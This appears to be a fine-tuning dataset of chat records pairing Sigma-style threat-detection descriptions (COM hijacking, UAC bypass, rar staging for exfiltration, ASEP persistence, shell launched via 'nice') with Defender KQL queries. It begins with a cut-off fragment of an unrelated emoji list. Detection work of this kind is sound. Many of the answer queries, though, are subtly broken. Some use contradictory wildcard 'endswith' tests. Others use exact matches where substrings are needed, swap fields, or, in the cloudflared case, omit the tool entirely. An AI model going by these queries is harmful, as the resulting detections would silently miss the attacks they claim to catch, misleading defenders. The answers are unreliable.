\"\ud83d\udc68\ud83c\udfff\u200d\ud83c\udfed\", \"\ud83d\udc69\ud83c\udfff\u200d\ud83d\udcbb\", \"\ud83e\uddd1\ud83c\udfff\u200d\ud83d\udcbb\", \"\ud83d\udc68\ud83c\udfff\u200d\ud83d\udcbb\", \"\ud83d\udc69\ud83c\udfff\u200d\ud83d\udcbc\", \"\ud83e\uddd1\ud83c\udfff\u200d\ud83d\udcbc\", \"\ud83d\udc68\ud83c\udfff\u200d\ud83d\udcbc\", \"\ud83d\udc69\ud83c\udfff\u200d\ud83d\udd27\", \"\ud83e\uddd1\ud83c\udfff\u200d\ud83d\udd27\", \"\ud83d\udc68\ud83c\udfff\u200d\ud83d\udd27\", \"\ud83d\udc69\ud83c\udfff\u200d\ud83d\udd2c\", \"\ud83e\uddd1\ud83c\udfff\u200d\ud83d\udd2c\", \"\ud83d\udc68\ud83c\udfff\u200d\ud83d\udd2c\", \"\ud83d\udc69\ud83c\udfff\u200d\ud83c\udfa8\", \"\ud83e\uddd1\ud83c\udfff\u200d\ud83c\udfa8\", \"\ud83d\udc68\ud83c\udfff\u200d\ud83c\udfa8\", \"\ud83d\udc69\ud83c\udfff\u200d\ud83d\ude92\", \"\ud83e\uddd1\ud83c\udfff\u200d\ud83d\ude92\", \"\ud83d\udc68\ud83c\udfff\u200d\ud83d\ude92\", \"\ud83d\udc69\ud83c\udfff\u200d\u2708\ufe0f\", \"\ud83e\uddd1\ud83c\udfff\u200d\u2708\ufe0f\", \"\ud83d\udc68\ud83c\udfff\u200d\u2708\ufe0f\", \"\ud83d\udc69\ud83c\udfff\u200d\ud83d\ude80\", \"\ud83e\uddd1\ud83c\udfff\u200d\ud83d\ude80\", \"\ud83d\udc68\ud83c\udfff\u200d\ud83d\ude80\", \"\ud83d\udc69\ud83c\udfff\u200d\u2696\ufe0f\", \"\ud83e\uddd1\ud83c\udfff\u200d\u2696\ufe0f\", \"\ud83d\udc68\ud83c\udfff\u200d\u2696\ufe0f\", \"\ud83d\udc70\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83d\udc70\ud83c\udfff\", \"\ud83d\udc70\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83e\udd35\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83e\udd35\ud83c\udfff\", \"\ud83e\udd35\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83d\udc78\ud83c\udfff\", \"\ud83e\udec5\ud83c\udfff\", \"\ud83e\udd34\ud83c\udfff\", \"\ud83e\udd77\ud83c\udfff\", \"\ud83e\uddb8\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83e\uddb8\ud83c\udfff\", \"\ud83e\uddb8\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83e\uddb9\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83e\uddb9\ud83c\udfff\", \"\ud83e\uddb9\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83e\udd36\ud83c\udfff\", \"\ud83e\uddd1\ud83c\udfff\u200d\ud83c\udf84\", \"\ud83c\udf85\ud83c\udfff\", \"\ud83e\uddd9\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83e\uddd9\ud83c\udfff\", \"\ud83e\uddd9\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83e\udddd\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83e\udddd\ud83c\udfff\", \"\ud83e\udddd\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83e\udddb\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83e\udddb\ud83c\udfff\", \"\ud83e\udddb\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83e\udddc\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83e\udddc\ud83c\udfff\", \"\ud83e\udddc\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83e\uddda\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83e\uddda\ud83c\udfff\", \"\ud83e\uddda\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83d\udc7c\ud83c\udfff\", \"\ud83e\udd30\ud83c\udfff\", \"\ud83e\udec4\ud83c\udfff\", \"\ud83e\udec3\ud83c\udfff\", \"\ud83e\udd31\ud83c\udfff\", \"\ud83d\udc69\ud83c\udfff\u200d\ud83c\udf7c\", \"\ud83e\uddd1\ud83c\udfff\u200d\ud83c\udf7c\", \"\ud83d\udc68\ud83c\udfff\u200d\ud83c\udf7c\", \"\ud83d\ude47\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83d\ude47\ud83c\udfff\", \"\ud83d\ude47\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83d\udc81\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83d\udc81\ud83c\udfff\", \"\ud83d\udc81\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83d\ude45\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83d\ude45\ud83c\udfff\", \"\ud83d\ude45\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83d\ude46\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83d\ude46\ud83c\udfff\", \"\ud83d\ude46\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83d\ude4b\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83d\ude4b\ud83c\udfff\", \"\ud83d\ude4b\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83e\uddcf\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83e\uddcf\ud83c\udfff\", \"\ud83e\uddcf\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83e\udd26\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83e\udd26\ud83c\udfff\", \"\ud83e\udd26\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83e\udd37\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83e\udd37\ud83c\udfff\", \"\ud83e\udd37\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83d\ude4e\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83d\ude4e\ud83c\udfff\", \"\ud83d\ude4e\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83d\ude4d\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83d\ude4d\ud83c\udfff\", \"\ud83d\ude4d\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83d\udc87\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83d\udc87\ud83c\udfff\", \"\ud83d\udc87\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83d\udc86\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83d\udc86\ud83c\udfff\", \"\ud83d\udc86\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83e\uddd6\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83e\uddd6\ud83c\udfff\", \"\ud83e\uddd6\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83d\udc83\ud83c\udfff\", \"\ud83d\udd7a\ud83c\udfff\", \"\ud83d\udd74\ud83c\udfff\", \"\ud83d\udc69\ud83c\udfff\u200d\ud83e\uddbd\", \"\ud83e\uddd1\ud83c\udfff\u200d\ud83e\uddbd\", \"\ud83d\udc68\ud83c\udfff\u200d\ud83e\uddbd\", \"\ud83d\udc69\ud83c\udfff\u200d\ud83e\uddbc\", \"\ud83e\uddd1\ud83c\udfff\u200d\ud83e\uddbc\", \"\ud83d\udc68\ud83c\udfff\u200d\ud83e\uddbc\", \"\ud83d\udeb6\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83d\udeb6\ud83c\udfff\", \"\ud83d\udeb6\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83d\udc69\ud83c\udfff\u200d\ud83e\uddaf\", \"\ud83e\uddd1\ud83c\udfff\u200d\ud83e\uddaf\", \"\ud83d\udc68\ud83c\udfff\u200d\ud83e\uddaf\", \"\ud83e\uddce\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83e\uddce\ud83c\udfff\", \"\ud83e\uddce\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83c\udfc3\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83c\udfc3\ud83c\udfff\", \"\ud83c\udfc3\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83e\uddcd\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83e\uddcd\ud83c\udfff\", \"\ud83e\uddcd\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83d\udc6d\ud83c\udfff\", \"\ud83e\uddd1\ud83c\udfff\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c\udfff\", \"\ud83d\udc6c\ud83c\udfff\", \"\ud83d\udc6b\ud83c\udfff\", \"\ud83e\uddd7\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83e\uddd7\ud83c\udfff\", \"\ud83e\uddd7\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83c\udfc7\ud83c\udfff\", \"\ud83c\udfc2\ud83c\udfff\", \"\ud83c\udfcc\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83c\udfcc\ud83c\udfff\", \"\ud83c\udfcc\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83c\udfc4\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83c\udfc4\ud83c\udfff\", \"\ud83c\udfc4\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83d\udea3\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83d\udea3\ud83c\udfff\", \"\ud83d\udea3\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83c\udfca\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83c\udfca\ud83c\udfff\", \"\ud83c\udfca\ud83c\udfff\u200d\u2642\ufe0f\", \"\u26f9\ud83c\udfff\u200d\u2640\ufe0f\", \"\u26f9\ud83c\udfff\", \"\u26f9\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83c\udfcb\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83c\udfcb\ud83c\udfff\", \"\ud83c\udfcb\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83d\udeb4\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83d\udeb4\ud83c\udfff\", \"\ud83d\udeb4\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83d\udeb5\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83d\udeb5\ud83c\udfff\", \"\ud83d\udeb5\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83e\udd38\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83e\udd38\ud83c\udfff\", \"\ud83e\udd38\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83e\udd3d\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83e\udd3d\ud83c\udfff\", \"\ud83e\udd3d\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83e\udd3e\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83e\udd3e\ud83c\udfff\", \"\ud83e\udd3e\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83e\udd39\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83e\udd39\ud83c\udfff\", \"\ud83e\udd39\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83e\uddd8\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83e\uddd8\ud83c\udfff\", \"\ud83e\uddd8\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83d\udec0\ud83c\udfff\", \"\ud83d\udecc\ud83c\udfff\", \"\ud83d\udc36\", \"\ud83d\udc31\", \"\ud83d\udc2d\", \"\ud83d\udc39\", \"\ud83d\udc30\", \"\ud83e\udd8a\", \"\ud83d\udc3b\", \"\ud83d\udc3c\", \"\ud83d\udc3b\u200d\u2744\ufe0f\", \"\ud83d\udc28\", \"\ud83d\udc2f\", \"\ud83e\udd81\", \"\ud83d\udc2e\", \"\ud83d\udc37\", \"\ud83d\udc3d\", \"\ud83d\udc38\", \"\ud83d\udc35\", \"\ud83d\ude48\", \"\ud83d\ude49\", \"\ud83d\ude4a\", \"\ud83d\udc12\", \"\ud83d\udc14\", \"\ud83d\udc27\", \"\ud83d\udc26\", \"\ud83d\udc24\", \"\ud83d\udc23\", \"\ud83d\udc25\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects COM object hijacking via TreatAs subkey Topic: registry_add_persistence_com_key_linking"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (ActionType =~ \"RegistryKeyCreated\" and (RegistryKey endswith \"HKU*\" and RegistryKey endswith \"Classes\\\\CLSID*\" and RegistryKey contains \"\\\\TreatAs\")) and (not(InitiatingProcessFolderPath =~ \"C:\\\\WINDOWS\\\\system32\\\\svchost.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of the \"cloudflared\" tool with the tunnel \"cleanup\" flag in order to cleanup tunnel connections. Topic: proc_creation_win_cloudflared_tunnel_cleanup"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"-config \", \"-connector-id \")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Running Chrome VPN Extensions via the Registry install 2 vpn extension Topic: registry_set_chrome_extension"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey contains \"Software\\\\Wow6432Node\\\\Google\\\\Chrome\\\\Extensions\" and RegistryKey endswith \"update_url\") and (RegistryKey contains \"fdcgdnkidjaadafnichfpabhfomcebme\" or RegistryKey contains \"fcfhplploccackoneaefokcmbjfbkenj\" or RegistryKey contains \"bihmplhobchoageeokmgbdihknkjbknd\" or RegistryKey contains \"gkojfkhlekighikafcpjkiklfbnlmeio\" or RegistryKey contains \"jajilbjjinjmgcibalaakngmkilboobh\" or RegistryKey contains \"gjknjjomckknofjidppipffbpoekiipm\" or RegistryKey contains \"nabbmpekekjknlbkgpodfndbodhijjem\" or RegistryKey contains \"kpiecbcckbofpmkkkdibbllpinceiihk\" or RegistryKey contains \"nlbejmccbhkncgokjcmghpfloaajcffj\" or RegistryKey contains \"omghfjlpggmjjaagoclmmobgdodcjboh\" or RegistryKey contains \"bibjcjfmgapbfoljiojpipaooddpkpai\" or RegistryKey contains \"mpcaainmfjjigeicjnlkdfajbioopjko\" or RegistryKey contains \"jljopmgdobloagejpohpldgkiellmfnc\" or RegistryKey contains \"lochiccbgeohimldjooaakjllnafhaid\" or RegistryKey contains \"nhnfcgpcbfclhfafjlooihdfghaeinfc\" or RegistryKey contains \"ookhnhpkphagefgdiemllfajmkdkcaim\" or RegistryKey contains \"namfblliamklmeodpcelkokjbffgmeoo\" or RegistryKey contains \"nbcojefnccbanplpoffopkoepjmhgdgh\" or RegistryKey contains \"majdfhpaihoncoakbjgbdhglocklcgno\" or RegistryKey contains \"lnfdmdhmfbimhhpaeocncdlhiodoblbd\" or RegistryKey contains \"eppiocemhmnlbhjplcgkofciiegomcon\" or RegistryKey contains \"cocfojppfigjeefejbpfmedgjbpchcng\" or RegistryKey contains \"foiopecknacmiihiocgdjgbjokkpkohc\" or RegistryKey contains \"hhdobjgopfphlmjbmnpglhfcgppchgje\" or RegistryKey contains \"jgbaghohigdbgbolncodkdlpenhcmcge\" or RegistryKey contains \"inligpkjkhbpifecbdjhmdpcfhnlelja\" or RegistryKey contains \"higioemojdadgdbhbbbkfbebbdlfjbip\" or RegistryKey contains \"hipncndjamdcmphkgngojegjblibadbe\" or RegistryKey contains \"iolonopooapdagdemdoaihahlfkncfgg\" or RegistryKey contains \"nhfjkakglbnnpkpldhjmpmmfefifedcj\" or RegistryKey contains \"jpgljfpmoofbmlieejglhonfofmahini\" or RegistryKey contains \"fgddmllnllkalaagkghckoinaemmogpe\" or RegistryKey contains \"ejkaocphofnobjdedneohbbiilggdlbi\" or RegistryKey contains \"keodbianoliadkoelloecbhllnpiocoi\" or RegistryKey contains \"hoapmlpnmpaehilehggglehfdlnoegck\" or RegistryKey contains \"poeojclicodamonabcabmapamjkkmnnk\" or RegistryKey contains \"dfkdflfgjdajbhocmfjolpjbebdkcjog\" or RegistryKey contains \"kcdahmgmaagjhocpipbodaokikjkampi\" or RegistryKey contains \"klnkiajpmpkkkgpgbogmcgfjhdoljacg\" or RegistryKey contains \"lneaocagcijjdpkcabeanfpdbmapcjjg\" or RegistryKey contains \"pgfpignfckbloagkfnamnolkeaecfgfh\" or RegistryKey contains \"jplnlifepflhkbkgonidnobkakhmpnmh\" or RegistryKey contains \"jliodmnojccaloajphkingdnpljdhdok\" or RegistryKey contains \"hnmpcagpplmpfojmgmnngilcnanddlhb\" or RegistryKey contains \"ffbkglfijbcbgblgflchnbphjdllaogb\" or RegistryKey contains \"kcndmbbelllkmioekdagahekgimemejo\" or RegistryKey contains \"jdgilggpfmjpbodmhndmhojklgfdlhob\" or RegistryKey contains \"bihhflimonbpcfagfadcnbbdngpopnjb\" or RegistryKey contains \"ppajinakbfocjfnijggfndbdmjggcmde\" or RegistryKey contains \"oofgbpoabipfcfjapgnbbjjaenockbdp\" or RegistryKey contains \"bhnhkdgoefpmekcgnccpnhjfdgicfebm\" or RegistryKey contains \"knmmpciebaoojcpjjoeonlcjacjopcpf\" or RegistryKey contains \"dhadilbmmjiooceioladdphemaliiobo\" or RegistryKey contains \"jedieiamjmoflcknjdjhpieklepfglin\" or RegistryKey contains \"mhngpdlhojliikfknhfaglpnddniijfh\" or RegistryKey contains \"omdakjcmkglenbhjadbccaookpfjihpa\" or RegistryKey contains \"npgimkapccfidfkfoklhpkgmhgfejhbj\" or RegistryKey contains \"akeehkgglkmpapdnanoochpfmeghfdln\" or RegistryKey contains \"gbmdmipapolaohpinhblmcnpmmlgfgje\" or RegistryKey contains \"aigmfoeogfnljhnofglledbhhfegannp\" or RegistryKey contains \"cgojmfochfikphincbhokimmmjenhhgk\" or RegistryKey contains \"ficajfeojakddincjafebjmfiefcmanc\" or RegistryKey contains \"ifnaibldjfdmaipaddffmgcmekjhiloa\" or RegistryKey contains \"jbnmpdkcfkochpanomnkhnafobppmccn\" or RegistryKey contains \"apcfdffemoinopelidncddjbhkiblecc\" or RegistryKey contains \"mjolnodfokkkaichkcjipfgblbfgojpa\" or RegistryKey contains \"oifjbnnafapeiknapihcmpeodaeblbkn\" or RegistryKey contains \"plpmggfglncceinmilojdkiijhmajkjh\" or RegistryKey contains \"mjnbclmflcpookeapghfhapeffmpodij\" or RegistryKey contains \"bblcccknbdbplgmdjnnikffefhdlobhp\" or RegistryKey contains \"aojlhgbkmkahabcmcpifbolnoichfeep\" or RegistryKey contains \"lcmammnjlbmlbcaniggmlejfjpjagiia\" or RegistryKey contains \"knajdeaocbpmfghhmijicidfcmdgbdpm\" or RegistryKey contains \"bdlcnpceagnkjnjlbbbcepohejbheilk\" or RegistryKey contains \"edknjdjielmpdlnllkdmaghlbpnmjmgb\" or RegistryKey contains \"eidnihaadmmancegllknfbliaijfmkgo\" or RegistryKey contains \"ckiahbcmlmkpfiijecbpflfahoimklke\" or RegistryKey contains \"macdlemfnignjhclfcfichcdhiomgjjb\" or RegistryKey contains \"chioafkonnhbpajpengbalkececleldf\" or RegistryKey contains \"amnoibeflfphhplmckdbiajkjaoomgnj\" or RegistryKey contains \"llbhddikeonkpbhpncnhialfbpnilcnc\" or RegistryKey contains \"pcienlhnoficegnepejpfiklggkioccm\" or RegistryKey contains \"iocnglnmfkgfedpcemdflhkchokkfeii\" or RegistryKey contains \"igahhbkcppaollcjeaaoapkijbnphfhb\" or RegistryKey contains \"njpmifchgidinihmijhcfpbdmglecdlb\" or RegistryKey contains \"ggackgngljinccllcmbgnpgpllcjepgc\" or RegistryKey contains \"kchocjcihdgkoplngjemhpplmmloanja\" or RegistryKey contains \"bnijmipndnicefcdbhgcjoognndbgkep\" or RegistryKey contains \"lklekjodgannjcccdlbicoamibgbdnmi\" or RegistryKey contains \"dbdbnchagbkhknegmhgikkleoogjcfge\" or RegistryKey contains \"egblhcjfjmbjajhjhpmnlekffgaemgfh\" or RegistryKey contains \"ehbhfpfdkmhcpaehaooegfdflljcnfec\" or RegistryKey contains \"bkkgdjpomdnfemhhkalfkogckjdkcjkg\" or RegistryKey contains \"almalgbpmcfpdaopimbdchdliminoign\" or RegistryKey contains \"akkbkhnikoeojlhiiomohpdnkhbkhieh\" or RegistryKey contains \"gbfgfbopcfokdpkdigfmoeaajfmpkbnh\" or RegistryKey contains \"bniikohfmajhdcffljgfeiklcbgffppl\" or RegistryKey contains \"lejgfmmlngaigdmmikblappdafcmkndb\" or RegistryKey contains \"ffhhkmlgedgcliajaedapkdfigdobcif\" or RegistryKey contains \"gcknhkkoolaabfmlnjonogaaifnjlfnp\" or RegistryKey contains \"pooljnboifbodgifngpppfklhifechoe\" or RegistryKey contains \"fjoaledfpmneenckfbpdfhkmimnjocfa\" or RegistryKey contains \"aakchaleigkohafkfjfjbblobjifikek\" or RegistryKey contains \"dpplabbmogkhghncfbfdeeokoefdjegm\" or RegistryKey contains \"padekgcemlokbadohgkifijomclgjgif\" or RegistryKey contains \"bfidboloedlamgdmenmlbipfnccokknp\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects command line containing reference to the \"::$index_allocation\" stream, which can be used as a technique to prevent access to folders or files from tooling such as \"explorer.exe\" or \"powershell.exe\"\n Topic: proc_creation_win_susp_hidden_dir_index_allocation"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"::$index_allocation\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of iexpress.exe to create binaries via Self Extraction Directive (SED) files located in potentially suspicious locations.\nThis behavior has been observed in-the-wild by different threat actors.\n Topic: proc_creation_win_iexpress_susp_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine contains \" -n \" or ProcessCommandLine contains \" /n \" or ProcessCommandLine contains \" \u2013n \" or ProcessCommandLine contains \" \u2014n \" or ProcessCommandLine contains \" \u2015n \") and (FolderPath endswith \"\\\\iexpress.exe\" or ProcessVersionInfoOriginalFileName =~ \"IEXPRESS.exe\") and (ProcessCommandLine in~ (\":\\\\ProgramData\\\\\", \":\\\\Temp\\\\\", \":\\\\Windows\\\\System32\\\\Tasks\\\\\", \":\\\\Windows\\\\Tasks\\\\\", \":\\\\Windows\\\\Temp\\\\\", \"\\\\AppData\\\\Local\\\\Temp\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of \"rar\" to add files to an archive for potential compression. An adversary may compress data (e.g. sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network. Topic: proc_creation_win_rar_compress_data"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \" a \" and InitiatingProcessFolderPath =~ \"\\\\rar.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects renamed vmnat.exe or portable version that can be used for DLL side-loading Topic: proc_creation_win_renamed_vmnat"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessVersionInfoOriginalFileName =~ \"vmnat.exe\" and (not(InitiatingProcessFolderPath =~ \"vmnat.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Bypasses User Account Control using a fileless method Topic: registry_set_bypass_uac_using_delegateexecute"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\open\\\\command\\\\DelegateExecute\" and RegistryValueData =~ \"(Empty)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of findstr with the \"s\" and \"i\" flags for a \"subfolder\" and \"insensitive\" search respectively. Attackers sometimes leverage this built-in utility to search the system for interesting files or filter through results of commands.\n Topic: proc_creation_win_findstr_subfolder_search"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine contains \"findstr\" or FolderPath endswith \"findstr.exe\" or ProcessVersionInfoOriginalFileName =~ \"FINDSTR.EXE\") and ((ProcessCommandLine contains \" -s \" or ProcessCommandLine contains \" /s \" or ProcessCommandLine contains \" \u2013s \" or ProcessCommandLine contains \" \u2014s \" or ProcessCommandLine contains \" \u2015s \") and (ProcessCommandLine contains \" -i \" or ProcessCommandLine contains \" /i \" or ProcessCommandLine contains \" \u2013i \" or ProcessCommandLine contains \" \u2014i \" or ProcessCommandLine contains \" \u2015i \"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of the \"nice\" utility to execute a shell. Such behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.\n Topic: proc_creation_lnx_nice_shell_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine endswith \"/bin/bash\" or ProcessCommandLine endswith \"/bin/dash\" or ProcessCommandLine endswith \"/bin/fish\" or ProcessCommandLine endswith \"/bin/sh\" or ProcessCommandLine endswith \"/bin/zsh\") and InitiatingProcessFolderPath =~ \"/nice\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of stordiag.exe to execute schtasks.exe systeminfo.exe and fltmc.exe Topic: proc_creation_win_stordiag_susp_child_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName =~ \"\\\\stordiag.exe\" and (InitiatingProcessFolderPath in~ (\"\\\\schtasks.exe\", \"\\\\systeminfo.exe\", \"\\\\fltmc.exe\"))) and (not((InitiatingProcessFileName in~ (\"c:\\\\windows\\\\system32\\\\\", \"c:\\\\windows\\\\syswow64\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of the Add-In deployment cache updating utility (AddInutil.exe) from a non-standard directory. Topic: proc_creation_win_addinutil_uncommon_dir_exec"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\addinutil.exe\" or ProcessVersionInfoOriginalFileName =~ \"AddInUtil.exe\") and (not((FolderPath contains \":\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\\" or FolderPath contains \":\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\\" or FolderPath contains \":\\\\Windows\\\\WinSxS\\\\\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects modification of autostart extensibility point (ASEP) in registry. Topic: registry_set_asep_reg_keys_modification_currentcontrolset"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey contains \"\\\\SYSTEM\\\\CurrentControlSet\\\\Control\" and (RegistryKey contains \"\\\\Terminal Server\\\\WinStations\\\\RDP-Tcp\\\\InitialProgram\" or RegistryKey contains \"\\\\Terminal Server\\\\Wds\\\\rdpwd\\\\StartupPrograms\" or RegistryKey contains \"\\\\SecurityProviders\\\\SecurityProviders\" or RegistryKey contains \"\\\\SafeBoot\\\\AlternateShell\" or RegistryKey contains \"\\\\Print\\\\Providers\" or RegistryKey contains \"\\\\Print\\\\Monitors\" or RegistryKey contains \"\\\\NetworkProvider\\\\Order\" or RegistryKey contains \"\\\\Lsa\\\\Notification Packages\" or RegistryKey contains \"\\\\Lsa\\\\Authentication Packages\" or RegistryKey contains \"\\\\BootVerificationProgram\\\\ImagePath\")) and (not((((RegistryValueData in~ (\"cpwmon64_v40.dll\", \"CutePDF Writer\")) and InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\System32\\\\spoolsv.exe\" and RegistryKey contains \"\\\\Print\\\\Monitors\\\\CutePDF Writer Monitor\") or RegistryValueData =~ \"(Empty)\" or (InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\System32\\\\spoolsv.exe\" and (InitiatingProcessAccountName in~ (\"AUTHORI\", \"AUTORI\")) and RegistryKey contains \"Print\\\\Monitors\\\\Appmon\\\\Ports\\\\Microsoft.Office.OneNote_\") or (InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\System32\\\\poqexec.exe\" and RegistryKey endswith \"\\\\NetworkProvider\\\\Order\\\\ProviderOrder\") or (RegistryValueData =~ \"VNCpm.dll\" and InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\System32\\\\spoolsv.exe\" and RegistryKey endswith \"\\\\Print\\\\Monitors\\\\MONVNC\\\\Driver\"))))"}]}
